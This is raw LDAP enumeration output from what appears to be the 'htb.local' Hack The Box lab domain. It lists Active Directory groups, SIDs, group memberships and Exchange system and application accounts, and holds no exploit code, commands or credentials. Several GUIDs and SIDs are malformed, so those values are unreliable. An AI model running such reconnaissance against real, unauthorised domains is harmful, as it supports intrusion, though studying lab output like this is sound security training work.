|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=htb,DC=local;0]
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         masteredBy: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|         msDs-masteredBy: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|         msDS-IsDomainFor: CN=NTDS Settings,CN=FOREST,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=htb,DC=local
|         dc: htb
|     dn: CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: container
|         cn: Users
|         description: Default container for upgraded user accounts
|         distinguishedName: CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 17:45:57 UTC
|         whenChanged: 2019/09/23 22:51:14 UTC
|         uSNCreated: 5888
|         uSNChanged: 94253
|         name: Users
|         objectGUID: 28cbed1a-9b7f-1e49-9fce-a053e95892cd
|         objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Allowed RODC Password Replication Group
|         description: Members in this group can have their passwords replicated to all read-only domain controllers in the domain
|         distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12402
|         uSNChanged: 12404
|         name: Allowed RODC Password Replication Group
|         objectGUID: 749868e0-3a64-c04d-9924-5bf97cfbd368
|         objectSid: 1-5-21-3072663084-364016917-1341370565-571
|         sAMAccountName: Allowed RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Denied RODC Password Replication Group
|         description: Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
|         member: CN=Read-only Domain Controllers,CN=Users,DC=htb,DC=local
|         member: CN=Group Policy Creator Owners,CN=Users,DC=htb,DC=local
|         member: CN=Domain Admins,CN=Users,DC=htb,DC=local
|         member: CN=Cert Publishers,CN=Users,DC=htb,DC=local
|         member: CN=Enterprise Admins,CN=Users,DC=htb,DC=local
|         member: CN=Schema Admins,CN=Users,DC=htb,DC=local
|         member: CN=Domain Controllers,CN=Users,DC=htb,DC=local
|         member: CN=krbtgt,CN=Users,DC=htb,DC=local
|         distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12405
|         uSNChanged: 12433
|         name: Denied RODC Password Replication Group
|         objectGUID: 85841ef1-9221-204d-889c-673355fe244f
|         objectSid: 1-5-21-3072663084-364016917-1341370565-572
|         sAMAccountName: Denied RODC Password Replication Group
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Read-only Domain Controllers,CN=Users,DC=htb,DC=local
|     dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Enterprise Read-only Domain Controllers
|         description: Members of this group are Read-Only Domain Controllers in the enterprise
|         distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12429
|         uSNChanged: 12431
|         name: Enterprise Read-only Domain Controllers|         objectGUID: f9d71231-d92-740-b238-8480a1a03d3
|         objectSid: 1-5-21-3072663084-364016917-1341370565-498
|         sAMAccountName: Enterprise Read-only Domain Controllers
|         sAMAccountType: 268435456
|         groupType: -2147483640
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Cloneable Domain Controllers
|         description: Members of this group that are domain controllers may be cloned.
|         distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12440
|         uSNChanged: 12442
|         name: Cloneable Domain Controllers
|         objectGUID: d8693b95-c468-ea44-8748-dc45c26dd433
|         objectSid: 1-5-21-3072663084-364016917-1341370565-522
|         sAMAccountName: Cloneable Domain Controllers
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Protected Users,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Protected Users
|         description: Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
|         distinguishedName: CN=Protected Users,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12445
|         uSNChanged: 12447
|         name: Protected Users
|         objectGUID: f49ff1f0-ac6e-b445-8b0-4557dad337dc
|         objectSid: 1-5-21-3072663084-364016917-1341370565-525
|         sAMAccountName: Protected Users
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Key Admins,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Key Admins
|         description: Members of this group can perform administrative actions on key objects within the domain.
|         distinguishedName: CN=Key Admins,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12450
|         uSNChanged: 12452
|         name: Key Admins
|         objectGUID: d96a5abb-188-3a4f-9094-6c69574d82ad
|         objectSid: 1-5-21-3072663084-364016917-1341370565-526
|         sAMAccountName: Key Admins
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Enterprise Key Admins,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: Enterprise Key Admins
|         description: Members of this group can perform administrative actions on key objects within the forest.
|         distinguishedName: CN=Enterprise Key Admins,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:53:23 UTC
|         whenChanged: 2019/09/18 10:53:23 UTC
|         uSNCreated: 12453
|         uSNChanged: 12455
|         name: Enterprise Key Admins
|         objectGUID: 8ca3f11-ac78-b745-a32f-8cfa23b7f093
|         objectSid: 1-5-21-3072663084-364016917-1341370565-527
|         sAMAccountName: Enterprise Key Admins
|         sAMAccountType: 268435456
|         groupType: -2147483640
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=DnsAdmins,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: DnsAdmins
|         description: DNS Administrators Group
|         distinguishedName: CN=DnsAdmins,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:54:03 UTC
|         whenChanged: 2019/09/18 10:54:03 UTC
|         uSNCreated: 12483
|         uSNChanged: 12485
|         name: DnsAdmins
|         objectGUID: 64d78f1a-39a7-fe4f-ba23-eae7f846b8b
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1101
|         sAMAccountName: DnsAdmins
|         sAMAccountType: 536870912
|         groupType: -2147483644
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: group
|         cn: DnsUpdateProxy
|         description: DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
|         distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/18 10:54:03 UTC
|         whenChanged: 2019/09/18 10:54:03 UTC
|         uSNCreated: 12488
|         uSNChanged: 12488
|         name: DnsUpdateProxy
|         objectGUID: c2c7c95-4bea-8a45-a494-93df6f83979a
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1102
|         sAMAccountName: DnsUpdateProxy
|         sAMAccountType: 268435456
|         groupType: -2147483646
|         objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|     dn: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: Exchange Online-ApplicationAccount
|         distinguishedName: CN=Exchange Online-ApplicationAccount,CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:26 UTC
|         whenChanged: 2019/09/19 11:11:26 UTC
|         uSNCreated: 23683
|         uSNChanged: 23684
|         garbageCollPeriod: 1209600
|         name: Exchange Online-ApplicationAccount
|         objectGUID: 2f9f1f5c-ec7d-214c-8ffa-4dc777e76c4a
|         userAccountControl: 546
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1123
|         sAMAccountName: $331000-VK4ADACQNUCA
|         sAMAccountType: 805306368
|         userPrincipalName: Exchange_Online-ApplicationAccount@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         msExchVersion: 1130555651391488
|         msExchProvisioningFlags: 0
|         msExchMailboxAuditEnable: FALSE
|         msExchUserBL: CN=MeetingGraphApplication-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=MailboxSearchApplication-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=TeamMailboxLifecycleApplication-Exchange Online-ApplicationAccou,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=Mailbox Search-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=LegalHoldApplication-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=ArchiveApplication-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchUserBL: CN=UserApplication-Exchange Online-ApplicationAccount,CN=Role Assignments,CN=RBAC,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchTransportRecipientSettingsFlags: 0
|         internetEncoding: 0
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 0
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchRecipientDisplayType: 12
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchMDBRulesQuota: 256
|         msExchRecipientTypeDetails: 33554432
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
|         sn: MSExchApproval 1f05a927-3be2-4fb9-aa03-b59fe3b56f4c
|         distinguishedName: CN=SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1},CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:47:15 UTC
|         displayName: Microsoft Exchange Approval Assistant
|         uSNCreated: 23777
|         uSNChanged: 24819
|         proxyAddresses: SMTP:SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local
|         name: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
|         objectGUID: 7a1aa2b-484c-474a-b291-2026675efed
|         userAccountControl: 514
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1124
|         sAMAccountName: SM_2c8eef0a09b545acb
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=4d0d9ee8e5aa4097bfd477c844b94abf-Syste
|         userPrincipalName: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}@htb.local
|         msExchVersion: 1126140425011200
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=ModeratedRecipients,CN=Approval Applications,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=AutoGroup,CN=Approval Applications,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchRequireAuthToSendTo: TRUE
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 130
|         msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMailboxGuid: \xD8\x14\xC5\x13\xFC\xF4pA\x9C\xA8,\xB1\x03\xB5|\xB4
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:797836624526913052927892047252322452711419621
|         msExchUMDtmfMap: lastNameFirstName:6739242777682513052927323243292203259333256342
|         msExchUMDtmfMap: firstNameLastName:6739242777682513052927323243292203259333256342
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: SystemMailbox{1f05a927-89c0-4725-adca-4527114196a1}
|         msExchWhenMailboxCreated: 20190919114715.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
|         sn: SystemMailbox bb558c35-97f1-4cb9-8ff7-d53741dc928c
|         distinguishedName: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:49:31 UTC
|         displayName: Microsoft Exchange
|         uSNCreated: 23782
|         uSNChanged: 24888
|         proxyAddresses: SMTP:SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local
|         name: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
|         objectGUID: c271a7f4-030-f543-a3a4-741abcd8bec3
|         userAccountControl: 514
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1125
|         sAMAccountName: SM_ca8c2ed5bdab4dc9b
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=5f90cd7455db492fb2b3b90df3946396-Syste
|         userPrincipalName: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}@htb.local
|         msExchVersion: 1126140425011200
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=ModeratedRecipients,CN=Approval Applications,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchApprovalApplicationLink: CN=AutoGroup,CN=Approval Applications,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchRequireAuthToSendTo: TRUE
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 130
|         msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMailboxGuid: N\xD2\x15\xDBz\xFD\xE9M\xB5K8b\x1B\xB5	L
|         msExchTextMessagingState: 302120705
|         msExchTextMessagingState: 16842751
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:797836624526922558235973142298337353741329282
|         msExchUMDtmfMap: lastNameFirstName:797836624526922558235973142298337353741329282
|         msExchUMDtmfMap: firstNameLastName:797836624526922558235973142298337353741329282
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchCapabilityIdentifiers: 46
|         msExchCapabilityIdentifiers: 52
|         msExchCapabilityIdentifiers: 51
|         msExchCapabilityIdentifiers: 47
|         msExchCapabilityIdentifiers: 44
|         msExchCapabilityIdentifiers: 43
|         msExchCapabilityIdentifiers: 42
|         msExchCapabilityIdentifiers: 40
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
|         msExchMailboxFolderSet: 0
|         submissionContLength: 1048576
|         msExchRecipientDisplayType: 10
|         mDBUseDefaults: FALSE
|         msExchBypassAudit: FALSE
|         msExchMailboxAuditLogAgeLimit: 7776000
|         msExchPoliciesIncluded: f5cca5ec-fafc-4e09-8b7f-be05572cb7cb
|         msExchPoliciesIncluded: {26491cfc-9e50-4857-861b-0cb8df22b5d7}
|         msExchOABGeneratingMailboxBL: CN=Default Offline Address Book,CN=Offline Address Lists,CN=Address Lists Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchRecipientTypeDetails: 8388608
|         mailNickname: SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}
|         msExchWhenMailboxCreated: 20190919114721.0Z
|         msExchGroupSecurityFlags: 0
|         msExchAddressBookFlags: 1
|     dn: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=htb,DC=local
|         objectClass: top
|         objectClass: person
|         objectClass: organizationalPerson
|         objectClass: user
|         cn: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
|         sn: MsExchDiscovery e0dc1c29-89c3-4034-b678-e6c29d823ed9
|         distinguishedName: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=htb,DC=local
|         instanceType: 4
|         whenCreated: 2019/09/19 11:11:27 UTC
|         whenChanged: 2019/09/19 11:47:29 UTC
|         displayName: Microsoft Exchange
|         uSNCreated: 23787
|         uSNChanged: 24836
|         proxyAddresses: SMTP:SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local
|         name: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}
|         objectGUID: 19e3b87e-ca26-1945-b3c-c5583fbd925
|         userAccountControl: 514
|         pwdLastSet: Never
|         primaryGroupID: 513
|         objectSid: 1-5-21-3072663084-364016917-1341370565-1126
|         sAMAccountName: SM_75a538d3025e4db9a
|         sAMAccountType: 805306368
|         legacyExchangeDN: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=44aefc0a94d2429fa20e64cf51b1c537-Syste
|         userPrincipalName: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local
|         objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=htb,DC=local
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 2021/09/04 15:59:39 UTC
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         mail: SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}@htb.local
|         msExchVersion: 1126140425011200
|         msExchProvisioningFlags: 0
|         homeMDB: CN=Mailbox Database 1118319013,CN=Databases,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchMailboxSecurityDescriptor: \x01\x00\x04\x80\x14\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00,\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00\x04\x00\x1C\x00\x01\x00\x00\x00\x00\x02\x14\x00\x05\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchRequireAuthToSendTo: TRUE
|         msExchArchiveQuota: 104857600
|         msExchMailboxAuditEnable: FALSE
|         msExchTransportRecipientSettingsFlags: 0
|         msExchDumpsterWarningQuota: 20971520
|         msExchELCMailboxFlags: 2
|         msExchMailboxTemplateLink: CN=ArbitrationMailbox,CN=Retention Policies Container,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=htb,DC=local
|         msExchHideFromAddressLists: TRUE
|         msExchHomeServerName: /o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=EXCH01
|         msExchMasterAccountSid: \x01\x01\x00\x00\x00\x00\x00\x05
|         \x00\x00\x00
|         msExchMailboxGuid: \xAA
|         2\x88\xBF\xA3@K\xB4\x96E\x972\xFD"=
|         msExchDumpsterQuota: 31457280
|         msExchCalendarLoggingQuota: 6291456
|         msExchUMDtmfMap: emailAddress:797836624526930321229892340342678362293823339
|         msExchUMDtmfMap: lastNameFirstName:67392434726837930321229892340342678362293823339
|         msExchUMDtmfMap: firstNameLastName:67392434726837930321229892340342678362293823339
|         msExchArchiveWarnQuota: 94371840
|         msExchModerationFlags: 6
|         msExchCapabilityIdentifiers: 41
|         msExchRecipientSoftDeletedStatus: 0
|         msExchUserAccountControl: 2
|         msExchUMEnabledFlags2: -1
